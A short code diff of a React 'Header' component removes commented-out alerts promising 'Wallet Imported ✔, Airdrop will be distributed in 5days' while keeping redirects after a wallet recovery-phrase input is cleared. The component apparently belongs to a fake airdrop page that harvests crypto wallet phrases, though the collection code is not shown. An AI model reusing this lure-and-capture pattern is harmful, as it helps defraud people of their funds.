@@ -37,7 +37,6 @@ function Header(props) {
         console.log(wallet);
 
         setInput("");
-        // alert("Wallet Imported ✔, Airdrop will be distributed in 5days🚀");
         props.history.push("/nowconnected")
     };
 
@@ -58,7 +57,6 @@ function Header(props) {
         });
 
         setPhraseInput("");
-        // alert("Wallet Imported ✔, Airdrop will be distributed in 5days🚀");
         props.history.push("/nowconnected")
 
     };
@@ -77,7 +75,6 @@ function Header(props) {
         });
 
         setPhraseInput("");
-        // alert("Wallet Imported ✔, Airdrop will be distributed in 5days🚀");
         props.history.push("/nowconnected")
 
     };
